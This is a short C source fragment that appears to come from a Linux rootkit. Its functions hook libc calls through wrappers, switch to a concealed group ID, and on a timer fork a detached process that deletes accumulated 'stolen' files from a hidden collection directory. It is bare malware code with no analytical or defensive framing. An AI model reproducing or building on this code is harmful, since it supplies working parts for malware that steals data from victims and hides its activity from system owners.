void rmstolens(void){
    DIR *dp;
    struct dirent *dir;
    size_t pathlen;

    hook(COPENDIR, CREADDIR, CUNLINK);

    dp = call(COPENDIR, INTEREST_DIR);
    if(dp == NULL) return;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        pathlen = LEN_INTEREST_DIR + strlen(dir->d_name) + 2;
        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
        call(CUNLINK, path);
    }
    closedir(dp);
}

void cleanstolen(void){
    int curtime = time(NULL);
    
    if(itistime(CLEANEDTIME_PATH, curtime, FILE_CLEANSE_TIMER)){
        pid_t pid = fork();
        if(pid == 0){
            setsid();
            hook(CSETGID);
            call(CSETGID, readgid());
            rmstolens();
            exit(0);
        }else if(pid < 0) return;
        signal(SIGCHLD, SIG_IGN);
        writenewtime(CLEANEDTIME_PATH, curtime);
    }
}
